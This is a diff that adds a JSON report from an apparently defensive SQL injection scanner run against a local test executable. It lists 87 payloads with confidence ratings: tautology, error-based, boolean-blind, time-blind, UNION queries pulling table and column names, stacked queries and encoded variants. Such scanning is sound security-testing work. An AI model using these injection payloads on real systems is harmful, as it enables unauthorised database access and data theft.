@@ -1,0 +1,797 @@
+{
+  "generated_at": "2026-11-09T17:06:12.495699+00:00",
+  "target": "target\\campus_utility_secure.exe",
+  "aborted": false,
+  "abort_reason": null,
+  "tests_executed": 87,
+  "confidence_summary": {
+    "negative": 54,
+    "inconclusive": 11,
+    "suspected": 22
+  },
+  "findings": [
+    {
+      "test_id": "classic_01",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR '1'='1",
+      "timestamp": "2026-11-09T17:06:10.606300Z"
+    },
+    {
+      "test_id": "classic_02",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1 OR 1=1",
+      "timestamp": "2026-11-09T17:06:10.638980Z"
+    },
+    {
+      "test_id": "classic_03",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 1=1-- ",
+      "timestamp": "2026-11-09T17:06:10.669952Z"
+    },
+    {
+      "test_id": "classic_04",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' AND 1=1-- ",
+      "timestamp": "2026-11-09T17:06:10.696955Z"
+    },
+    {
+      "test_id": "classic_05",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 'a'='a",
+      "timestamp": "2026-11-09T17:06:10.724849Z"
+    },
+    {
+      "test_id": "classic_06",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 2>1-- ",
+      "timestamp": "2026-11-09T17:06:10.753740Z"
+    },
+    {
+      "test_id": "classic_07",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 'x' LIKE 'x",
+      "timestamp": "2026-11-09T17:06:10.782543Z"
+    },
+    {
+      "test_id": "classic_08",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR '1'='1' /*",
+      "timestamp": "2026-11-09T17:06:10.807937Z"
+    },
+    {
+      "test_id": "error_01",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1'",
+      "timestamp": "2026-11-09T17:06:10.820696Z"
+    },
+    {
+      "test_id": "error_02",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1\")",
+      "timestamp": "2026-11-09T17:06:10.835198Z"
+    },
+    {
+      "test_id": "bool_01",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND '1'='1",
+      "timestamp": "2026-11-09T17:06:10.868088Z"
+    },
+    {
+      "test_id": "time_01",
+      "category": "time_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No verified engine-specific time-delay primitive is configured. Timing differences cannot be attributed to the payload.",
+      "payload": "1' AND <VERIFIED_DELAY_FUNCTION_PENDING>--",
+      "timestamp": "2026-11-09T17:06:10.881571Z"
+    },
+    {
+      "test_id": "union_01",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT name, sql FROM sqlite_master--",
+      "timestamp": "2026-11-09T17:06:10.897672Z"
+    },
+    {
+      "test_id": "second_order_01",
+      "category": "second_order",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "Second-order testing requires a real store operation followed by a separate read-back operation (list_profiles_after_store). This workflow is not yet implemented in TargetRunner.",
+      "payload": "o'brien' OR '1'='1",
+      "timestamp": "2026-11-09T17:06:10.911088Z"
+    },
+    {
+      "test_id": "classic_taut_09",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1\" OR \"1\"=\"1",
+      "timestamp": "2026-11-09T17:06:10.971201Z"
+    },
+    {
+      "test_id": "classic_taut_10",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 1 BETWEEN 0 AND 2-- ",
+      "timestamp": "2026-11-09T17:06:11.008460Z"
+    },
+    {
+      "test_id": "classic_taut_11",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR EXISTS(SELECT 1)-- ",
+      "timestamp": "2026-11-09T17:06:11.035550Z"
+    },
+    {
+      "test_id": "classic_quote_12",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1\\' OR \\'1\\'=\\'1",
+      "timestamp": "2026-11-09T17:06:11.049755Z"
+    },
+    {
+      "test_id": "classic_quote_13",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1'' OR ''1''=''1",
+      "timestamp": "2026-11-09T17:06:11.061860Z"
+    },
+    {
+      "test_id": "classic_quote_14",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1`) OR (`1`=`1",
+      "timestamp": "2026-11-09T17:06:11.075996Z"
+    },
+    {
+      "test_id": "classic_quote_15",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1] OR [1]=[1",
+      "timestamp": "2026-11-09T17:06:11.089576Z"
+    },
+    {
+      "test_id": "classic_quote_16",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1\" OR \"\" = \"",
+      "timestamp": "2026-11-09T17:06:11.104816Z"
+    },
+    {
+      "test_id": "classic_comment_17",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR '1'='1'#",
+      "timestamp": "2026-11-09T17:06:11.131010Z"
+    },
+    {
+      "test_id": "classic_comment_18",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1'/**/OR/**/'1'='1",
+      "timestamp": "2026-11-09T17:06:11.156939Z"
+    },
+    {
+      "test_id": "classic_comment_19",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1'-- -",
+      "timestamp": "2026-11-09T17:06:11.170914Z"
+    },
+    {
+      "test_id": "classic_comment_20",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR/*comment*/'1'='1",
+      "timestamp": "2026-11-09T17:06:11.199626Z"
+    },
+    {
+      "test_id": "classic_cond_21",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1-- ",
+      "timestamp": "2026-11-09T17:06:11.227252Z"
+    },
+    {
+      "test_id": "classic_cond_22",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR IIF(1=1,1,0)=1-- ",
+      "timestamp": "2026-11-09T17:06:11.256420Z"
+    },
+    {
+      "test_id": "classic_cond_23",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR IF(1=1,1,0)=1-- ",
+      "timestamp": "2026-11-09T17:06:11.285168Z"
+    },
+    {
+      "test_id": "classic_like_24",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 'anything' LIKE '%'-- ",
+      "timestamp": "2026-11-09T17:06:11.312080Z"
+    },
+    {
+      "test_id": "classic_like_25",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 'x' NOT LIKE 'y'-- ",
+      "timestamp": "2026-11-09T17:06:11.340978Z"
+    },
+    {
+      "test_id": "classic_like_26",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 'x' LIKE '_'-- ",
+      "timestamp": "2026-11-09T17:06:11.369100Z"
+    },
+    {
+      "test_id": "classic_stack_27",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1'; SELECT 1-- ",
+      "timestamp": "2026-11-09T17:06:11.383714Z"
+    },
+    {
+      "test_id": "classic_stack_28",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1'; SELECT sqlite_version()-- ",
+      "timestamp": "2026-11-09T17:06:11.396742Z"
+    },
+    {
+      "test_id": "classic_stack_29",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1'; WAITFOR DELAY '0:0:0'-- ",
+      "timestamp": "2026-11-09T17:06:11.409628Z"
+    },
+    {
+      "test_id": "error_03",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1' AND extractvalue(1, concat(0x7e, version()))-- ",
+      "timestamp": "2026-11-09T17:06:11.422222Z"
+    },
+    {
+      "test_id": "error_04",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1' AND CAST((SELECT version()) AS int)-- ",
+      "timestamp": "2026-11-09T17:06:11.436040Z"
+    },
+    {
+      "test_id": "error_05",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1' AND 1=CONVERT(int, (SELECT @@version))-- ",
+      "timestamp": "2026-11-09T17:06:11.448417Z"
+    },
+    {
+      "test_id": "error_06",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1' AND 1=CAST('x' AS INTEGER)-- ",
+      "timestamp": "2026-11-09T17:06:11.459633Z"
+    },
+    {
+      "test_id": "error_07",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1' AND updatexml(1, concat(0x7e, version()), 1)-- ",
+      "timestamp": "2026-11-09T17:06:11.472339Z"
+    },
+    {
+      "test_id": "error_08",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1' AND 1=(SELECT 1 FROM nonexistent_table_xyz)-- ",
+      "timestamp": "2026-11-09T17:06:11.485651Z"
+    },
+    {
+      "test_id": "bool_02",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND 1=1-- ",
+      "timestamp": "2026-11-09T17:06:11.510582Z"
+    },
+    {
+      "test_id": "bool_03",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND LENGTH('a')=1-- ",
+      "timestamp": "2026-11-09T17:06:11.542497Z"
+    },
+    {
+      "test_id": "bool_04",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND LEN('a')=1-- ",
+      "timestamp": "2026-11-09T17:06:11.568718Z"
+    },
+    {
+      "test_id": "bool_05",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND SUBSTRING('abc',1,1)='a'-- ",
+      "timestamp": "2026-11-09T17:06:11.598241Z"
+    },
+    {
+      "test_id": "bool_06",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND SUBSTR('abc',1,1)='a'-- ",
+      "timestamp": "2026-11-09T17:06:11.626076Z"
+    },
+    {
+      "test_id": "bool_cmp_07",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND 2>=2-- ",
+      "timestamp": "2026-11-09T17:06:11.656630Z"
+    },
+    {
+      "test_id": "bool_cmp_08",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND 2<=2-- ",
+      "timestamp": "2026-11-09T17:06:11.686109Z"
+    },
+    {
+      "test_id": "bool_cmp_09",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND 2!=3-- ",
+      "timestamp": "2026-11-09T17:06:11.716603Z"
+    },
+    {
+      "test_id": "bool_cmp_10",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND 2<>3-- ",
+      "timestamp": "2026-11-09T17:06:11.751060Z"
+    },
+    {
+      "test_id": "bool_null_11",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' OR NULL IS NULL-- ",
+      "timestamp": "2026-11-09T17:06:11.784951Z"
+    },
+    {
+      "test_id": "bool_null_12",
+      "category": "boolean_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No matched false-condition control was executed. Boolean behaviour cannot be established.",
+      "payload": "1' OR 1=1 OR NULL-- ",
+      "timestamp": "2026-11-09T17:06:11.800199Z"
+    },
+    {
+      "test_id": "bool_null_13",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND COALESCE(NULL,1)=1-- ",
+      "timestamp": "2026-11-09T17:06:11.829366Z"
+    },
+    {
+      "test_id": "bool_null_14",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND ISNULL(NULL,1)=1-- ",
+      "timestamp": "2026-11-09T17:06:11.858165Z"
+    },
+    {
+      "test_id": "bool_cast_15",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND CAST(1 AS CHAR)='1'-- ",
+      "timestamp": "2026-11-09T17:06:11.885409Z"
+    },
+    {
+      "test_id": "bool_cast_16",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND CAST('1' AS INTEGER)=1-- ",
+      "timestamp": "2026-11-09T17:06:11.911549Z"
+    },
+    {
+      "test_id": "bool_cast_17",
+      "category": "boolean_blind",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false condition payloads produced equivalent output.",
+      "payload": "1' AND '1'::int=1-- ",
+      "timestamp": "2026-11-09T17:06:11.944706Z"
+    },
+    {
+      "test_id": "time_mysql_02",
+      "category": "time_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No verified engine-specific time-delay primitive is configured. Timing differences cannot be attributed to the payload.",
+      "payload": "1' AND SLEEP(0)-- ",
+      "timestamp": "2026-11-09T17:06:11.960427Z"
+    },
+    {
+      "test_id": "time_pg_03",
+      "category": "time_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No verified engine-specific time-delay primitive is configured. Timing differences cannot be attributed to the payload.",
+      "payload": "1' AND pg_sleep(0)-- ",
+      "timestamp": "2026-11-09T17:06:11.972738Z"
+    },
+    {
+      "test_id": "time_mssql_04",
+      "category": "time_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No verified engine-specific time-delay primitive is configured. Timing differences cannot be attributed to the payload.",
+      "payload": "1' WAITFOR DELAY '0:0:0'-- ",
+      "timestamp": "2026-11-09T17:06:11.986217Z"
+    },
+    {
+      "test_id": "time_sqlite_05",
+      "category": "time_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No verified engine-specific time-delay primitive is configured. Timing differences cannot be attributed to the payload.",
+      "payload": "1' AND (SELECT COUNT(*) FROM sqlite_master AS t1, sqlite_master AS t2, sqlite_master AS t3)>0-- ",
+      "timestamp": "2026-11-09T17:06:11.999541Z"
+    },
+    {
+      "test_id": "time_mysql_06",
+      "category": "time_blind",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "No verified engine-specific time-delay primitive is configured. Timing differences cannot be attributed to the payload.",
+      "payload": "1' AND IF(1=1,SLEEP(0),0)-- ",
+      "timestamp": "2026-11-09T17:06:12.010752Z"
+    },
+    {
+      "test_id": "union_colcount_02",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' ORDER BY 1-- ",
+      "timestamp": "2026-11-09T17:06:12.024436Z"
+    },
+    {
+      "test_id": "union_colcount_03",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT NULL-- ",
+      "timestamp": "2026-11-09T17:06:12.038032Z"
+    },
+    {
+      "test_id": "union_colcount_04",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT NULL, NULL-- ",
+      "timestamp": "2026-11-09T17:06:12.051670Z"
+    },
+    {
+      "test_id": "union_meta_05",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT table_name, NULL FROM information_schema.tables-- ",
+      "timestamp": "2026-11-09T17:06:12.065553Z"
+    },
+    {
+      "test_id": "union_meta_06",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- ",
+      "timestamp": "2026-11-09T17:06:12.077512Z"
+    },
+    {
+      "test_id": "union_meta_07",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT @@version, NULL-- ",
+      "timestamp": "2026-11-09T17:06:12.091875Z"
+    },
+    {
+      "test_id": "union_meta_08",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT version(), NULL-- ",
+      "timestamp": "2026-11-09T17:06:12.105537Z"
+    },
+    {
+      "test_id": "union_meta_09",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT current_database(), NULL-- ",
+      "timestamp": "2026-11-09T17:06:12.120703Z"
+    },
+    {
+      "test_id": "union_meta_10",
+      "category": "union_based",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output structure or content changed after the UNION test, but no reliable database metadata leakage marker was identified.",
+      "payload": "1' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'-- ",
+      "timestamp": "2026-11-09T17:06:12.134772Z"
+    },
+    {
+      "test_id": "enc_url_01",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1%27%20OR%20%271%27%3D%271",
+      "timestamp": "2026-11-09T17:06:12.160623Z"
+    },
+    {
+      "test_id": "enc_dblurl_02",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1%2527%20OR%20%25271%2527%253D%25271",
+      "timestamp": "2026-11-09T17:06:12.173744Z"
+    },
+    {
+      "test_id": "enc_unicode_03",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1\u02b9 OR \u02b91\u02b9=\u02b91",
+      "timestamp": "2026-11-09T17:06:12.187876Z"
+    },
+    {
+      "test_id": "enc_hex_04",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR 1=0x31-- ",
+      "timestamp": "2026-11-09T17:06:12.214906Z"
+    },
+    {
+      "test_id": "enc_char_05",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1' OR CHAR(49)=CHAR(49)-- ",
+      "timestamp": "2026-11-09T17:06:12.240583Z"
+    },
+    {
+      "test_id": "enc_comment_06",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1'/**/OR/**/1=1-- ",
+      "timestamp": "2026-11-09T17:06:12.268057Z"
+    },
+    {
+      "test_id": "numeric_01",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1 AND 1=1",
+      "timestamp": "2026-11-09T17:06:12.300124Z"
+    },
+    {
+      "test_id": "numeric_02",
+      "category": "classic",
+      "confidence": "suspected",
+      "severity": "low",
+      "evidence": "Output or return code differs from baseline, but no matched false-condition control was executed. Confirmation is not justified.",
+      "payload": "1+1",
+      "timestamp": "2026-11-09T17:06:12.315597Z"
+    },
+    {
+      "test_id": "numeric_03",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "-1 OR 1=1",
+      "timestamp": "2026-11-09T17:06:12.345137Z"
+    },
+    {
+      "test_id": "numeric_04",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1e0 OR 1=1",
+      "timestamp": "2026-11-09T17:06:12.377000Z"
+    },
+    {
+      "test_id": "second_order_02",
+      "category": "second_order",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "Second-order testing requires a real store operation followed by a separate read-back operation (authenticate_user_after_store). This workflow is not yet implemented in TargetRunner.",
+      "payload": "admin'-- ",
+      "timestamp": "2026-11-09T17:06:12.391249Z"
+    },
+    {
+      "test_id": "second_order_03",
+      "category": "second_order",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "Second-order testing requires a real store operation followed by a separate read-back operation (render_profile_bio_after_store). This workflow is not yet implemented in TargetRunner.",
+      "payload": "x' UNION SELECT name, sql FROM sqlite_master-- ",
+      "timestamp": "2026-11-09T17:06:12.407656Z"
+    },
+    {
+      "test_id": "second_order_04",
+      "category": "second_order",
+      "confidence": "inconclusive",
+      "severity": "info",
+      "evidence": "Second-order testing requires a real store operation followed by a separate read-back operation (list_profiles_after_store). This workflow is not yet implemented in TargetRunner.",
+      "payload": "o''brien",
+      "timestamp": "2026-11-09T17:06:12.423203Z"
+    },
+    {
+      "test_id": "classic_paren_30",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1) OR (1=1",
+      "timestamp": "2026-11-09T17:06:12.454101Z"
+    },
+    {
+      "test_id": "classic_paren_31",
+      "category": "classic",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "True and false tautology payloads produced equivalent output.",
+      "payload": "1') OR ('1'='1",
+      "timestamp": "2026-11-09T17:06:12.482195Z"
+    },
+    {
+      "test_id": "error_paren_09",
+      "category": "error_based",
+      "confidence": "negative",
+      "severity": "info",
+      "evidence": "No recognized SQL error signature found.",
+      "payload": "1))",
+      "timestamp": "2026-11-09T17:06:12.495236Z"
+    }
+  ]
+}
